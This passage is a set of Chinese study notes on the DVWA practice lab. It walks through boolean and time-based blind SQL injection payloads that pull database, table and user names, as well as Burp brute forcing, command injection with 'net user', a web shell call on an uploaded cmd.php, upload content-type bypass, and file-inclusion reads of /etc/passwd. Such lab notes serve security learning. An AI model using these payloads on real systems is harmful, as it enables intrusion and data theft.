<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>qq_39670065<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">107875210</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>布尔盲注利用前提</span><br><span class="line">页面没有显示位，没有输出<span class="keyword">SQL</span>语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</span><br><span class="line"><span class="number">2.</span>布尔盲注利用    </span><br><span class="line">该语句判断数据库个数，当数据库个数大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata)<span class="operator">&gt;</span> n</span><br><span class="line"></span><br><span class="line">该语句判断数据库内第一个数据库名有多少字符，字符个数大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> length(schema_name) <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">&gt;</span> n</span><br><span class="line"></span><br><span class="line">该语句判断第一个库第一个字符是什么，ascii值大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span>n</span><br><span class="line"></span><br><span class="line">相关函数学习</span><br><span class="line">Length() 返回字符串的长度</span><br><span class="line">substr() 截取字符串，偏移是从<span class="number">1</span>开始，而不是<span class="number">0</span>开始</span><br><span class="line">ascii() 返回字符的ascii码</span><br><span class="line"><span class="built_in">count</span>(column_name) 返回指定列的值的数目(<span class="keyword">NULL</span> 不计入)</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>时间盲注利用前提</span><br><span class="line">页面上没有显示位，也没有输出<span class="keyword">SQL</span>语句执行错误信息。 正确的<span class="keyword">SQL</span>语句和错误的<span class="keyword">SQL</span>语句返回页面都一样，但是加入sleep(<span class="number">5</span>)条件之后，页面的返回速度明显慢了<span class="number">5</span>秒。</span><br><span class="line"><span class="number">2.</span>时间盲注利用</span><br><span class="line">该语句判断数据库个数，当数据库个数等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata)<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">该语句判断数据库内第一个数据库名有多少字符，字符个数等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> length(schema_name) <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">该语句判断第一个库第一个字符是什么，ascii值等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">相关函数学习</span><br><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">substr（）截取字符串</span><br><span class="line">ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br><span class="line"><span class="built_in">count</span>(column_name)函数返回指定列的值的数目(<span class="keyword">NULL</span> 不计入)</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 以下输入均显示存在		User ID exists in the database.</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1#</span></span><br><span class="line"><span class="string">-- 以下显示不存在		User ID is MISSING from the database.</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#</span><br><span class="line"><span class="comment">-- 此处判断存在字符型盲注</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 布尔盲注</span></span><br><span class="line"><span class="comment">-- 查数据库前要先判断数据库长度，发现x=4显示存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())=x#</span></span><br><span class="line"><span class="string">-- 二分法找数据库名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span>或小于字母ascii值#</span><br><span class="line"><span class="comment">-- d 100 v 118 w 119 a 97</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=100#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">118</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),3,1))=119#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span>#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- dvwa库中表的数量		x=2成立</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=x#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 表的长度		limit 0,1从第0行开始查一个</span></span><br><span class="line"><span class="string">--	guestbook</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr(&#x27;</span>guestbook<span class="string">&#x27;,1))=9#		--应该是有个强转str的步骤在里面</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(<span class="string">&#x27;guestbook&#x27;</span>)<span class="operator">=</span><span class="number">9</span>#</span><br><span class="line"><span class="comment">-- users</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>x#</span><br><span class="line"><span class="comment">-- g103 u117 e101 s115 t116 b98 o111 o111 k107</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=116#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">98</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),7,1))=111#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">8</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">111</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),9,1))=107#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- u 117 s 115 e 101 r 114 s 115</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1))=114#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- users表字段数量			x=8成立</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)=x#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 分别查找8个字段的长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span>x</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 二分法分别查找8个字段段的名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select user from dvwa.users limit 0,1)=&#x27;</span>admin</span><br><span class="line"><span class="comment">-- admin的a97</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97#</span></span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 此处应只用延迟判断</span></span><br><span class="line"><span class="comment">-- 有明显延迟			User ID is MISSING from the database.</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">-- 没有延迟				User ID exists in the database.</span></span><br><span class="line"><span class="string">1 and sleep(5)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定库名长</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=2,sleep(5),1) # 没有延迟</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">3</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=4,sleep(5),1) # 明显延迟</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表的数量</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if((<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() )<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表的长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</span></span><br><span class="line"><span class="string">后面差不多</span></span><br></pre></td></tr></table></figure>



<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数字型注入</span></span><br><span class="line">burpsuite抓包转repeater替换最后一行 去掉逗号抄low级别</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="operator">&amp;</span>Submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>

<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同low</span><br></pre></td></tr></table></figure>

<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE first_name like &#x27;%$id%&#x27;&quot;;</span><br><span class="line">#%表示任意字符 _表示任意单个字符</span><br><span class="line">#判断方法。输入%或_下划线能查询到所有数据，证明漏洞存在</span><br><span class="line">#like &#x27;%%%&#x27;				like &#x27;%_%&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="代码层面挖掘SQL注入漏洞"><a href="#代码层面挖掘SQL注入漏洞" class="headerlink" title="代码层面挖掘SQL注入漏洞"></a>代码层面挖掘SQL注入漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#代码中负责后去用户数据的变量:$_GET $_POST $_COOKIE $_SERVER</span><br><span class="line">#负责执行数据库查询操作的函数mysql_query()</span><br></pre></td></tr></table></figure>



<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_50339832/article/details/</span><br><span class="line">1.常用的账号密码比如top100 top500</span><br><span class="line">2.互联网被拖库后的账号密码比如当年的CSDN泄露的600w用户信息</span><br><span class="line">3.使用工具软件按照制定规则进行排列组合算法生成的字典，比如生日字典等</span><br><span class="line"></span><br><span class="line">send to intruder之后在position页面选择attack type</span><br><span class="line">sniper：狙击手，指定多个变量同时破解，但只设一个字典文件，将指定得到变量挨个用字典内容进行替换</span><br><span class="line">battering ram：攻城锤，指定多个变量，只设一个字典文件，将所有变量一起用字典内容替换，但需要分别设置字典文件，然后用对应的字典内容对变量进行替换</span><br><span class="line">cluster bomb：集束炸弹，指定多个变量，并未每个变量分别设置一个字典文件，然后用字典内容组合对变量进行替换</span><br><span class="line"></span><br><span class="line">payload type</span><br><span class="line">simple list：可以手动添加字典列表，也可以导入burpsuite自带的字典，或者导入自定义的字典</span><br><span class="line">runtime file：只能加载自定义的字典</span><br><span class="line">numbers：设定一个数值范围，从范围内一次或随机取值进行测试</span><br><span class="line">brute forcer：自己定义字符范围来生成字典文件</span><br></pre></td></tr></table></figure>

<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>qq_26406447<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">89882086</span></span><br></pre></td></tr></table></figure>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php_uname[<span class="string">&#x27;s&#x27;</span>]			<span class="comment">//获取操作系统信息</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;??&quot;</span>)		<span class="comment">//执行shell，php执行操作系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>个符号	| || &amp; &amp;&amp; ;</span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span> | net user		<span class="comment">//NET USER 用于创建和修改计算机上的用户帐户。当不带选项使用本命令时，它会列出计算机上的用户帐户。用户帐户的信息存储在用户帐户数据库中。　该命令仅在服务器上运行。</span></span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span> || net user		<span class="comment">//前面的命令执行不成功才会执行后面的命令</span></span><br><span class="line">    </span><br><span class="line">linux使用 ; 可以执行多条命令</span><br><span class="line">使用重定向&gt;在服务器生成文件，或者使用&lt;读取文件</span><br></pre></td></tr></table></figure>

<p>常见防范措施</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.对传入的命令严格过滤</span><br><span class="line">EscapeShellCmd()</span><br><span class="line">把字符串可能瞒过Shell而去执行另一个命令的字符转义，比如管道符|重定向&gt;文件读入&lt;</span><br><span class="line">EscapeShellArg()</span><br><span class="line">给定字符串加上单引号，并把字符串的单引号转义，这样字符串就可以安全地作为命令参数</span><br><span class="line">2.在后台对应用权限进行控制（比如给php建立独立得到账号，控制php启动权限）</span><br></pre></td></tr></table></figure>





<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传漏洞、SQL注入、XSS攻击是目前最主流得到Web攻击手法</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_44276741/article/details/115910426</span><br><span class="line">补充备注：</span><br><span class="line">Low		img有大小限制</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\dvwa.assets\1653012847740.png" alt="1653012847740"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在前端限制value大小，可以随便修改</span><br><span class="line">http://192.168.213.135/dvwa/hackable/uploads/cmd.php</span><br><span class="line">执行cmd			注意有分号</span><br><span class="line">http://192.168.213.135/dvwa/hackable/uploads/cmd.php?cmd=system(%22dir%22);</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\dvwa.assets\文件上_post.png" alt="文件上_post"><img src="C:\Users\hyy\Desktop\dvwa.assets\文件上传_get.png" alt="文件上传_get"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//中国蚁剑只能用post连接</span></span><br><span class="line"><span class="comment">//get从url拿，post从body拿</span></span><br></pre></td></tr></table></figure>

<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">上传文件的MIME类型		大类/小类</span><br><span class="line">html网页.html			text/html</span><br><span class="line">普通文本.txt			text/plain</span><br><span class="line">GIF图像.gif			image/gif</span><br><span class="line">JPEG图像.jpeg.jpg		image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="comment">//由服务器端php源码可知，判断是用content-type这个属性，这个属性是根据上传文件得到，又应为没有在前端加以限制，有2种解法</span></span><br><span class="line"><span class="comment">//上传.php格式文件，抓包改content-type为image/png</span></span><br><span class="line"><span class="comment">//上传.png格式文件，抓包改后缀为.php</span></span><br></pre></td></tr></table></figure>

<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//程序开发人员通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用得到过程称为包含。</span></span><br><span class="line"><span class="comment">//有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞</span></span><br><span class="line"><span class="comment">//可能存在漏洞的页面URL</span></span><br><span class="line"><span class="comment">//	http：//xxx/index.php?page=downloads.php</span></span><br><span class="line"><span class="comment">//	http：//xxx/index.php?page=main.php</span></span><br><span class="line"><span class="comment">//漏洞测试</span></span><br><span class="line"><span class="comment">//	http://xxx/index.php?page=C:\Windows\system.ini</span></span><br><span class="line"><span class="comment">//	http://xxx/index.php?page=/etc/passwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//http://192.168.213.135/dvwa/phpinfo.php查询allow_url_include是否打开，需要打开</span></span><br><span class="line"><span class="comment">//这个在dvwa/php.ini里面有设置，不过和php.ini里现实的不一样</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\dvwa.assets\1653633198694.png" alt="1653633198694"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://192.168.213.135/dvwa/vulnerabilities/fi/?page=/www/admin/localhost_80/wwwroot/dvwa/php.ini</span></span><br><span class="line"><span class="comment">// 	/etc/passwd也是绝对路径不知道为啥不行</span></span><br><span class="line"><span class="comment">//windows</span></span><br><span class="line"><span class="comment">//http://192.168.88.1/dvwa/vulnerabilities/fi/?page=D:\phpStudy\WWW\dvwa\php.ini</span></span><br><span class="line"><span class="comment">//参考资料</span></span><br><span class="line"><span class="comment">//http://t.zoukankan.com/yuzly-p-10799486.html</span></span><br><span class="line"><span class="comment">//https://blog.csdn.net/King0237/article/details/115055549</span></span><br></pre></td></tr></table></figure>

<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require(),找不到被包含的文件时产生致命错误，并停止脚本运行</span><br><span class="line">include(),找不到被包含文件时只会产生警告，脚本将继续运行</span><br><span class="line">include_once()与include()类似，唯一区别时如果该文件中代码已经被包含，则不会再次包含</span><br><span class="line">require_once()与require()类似，唯一区别时如果该文件中的代码已经被包含，则不会再次包含</span><br></pre></td></tr></table></figure>

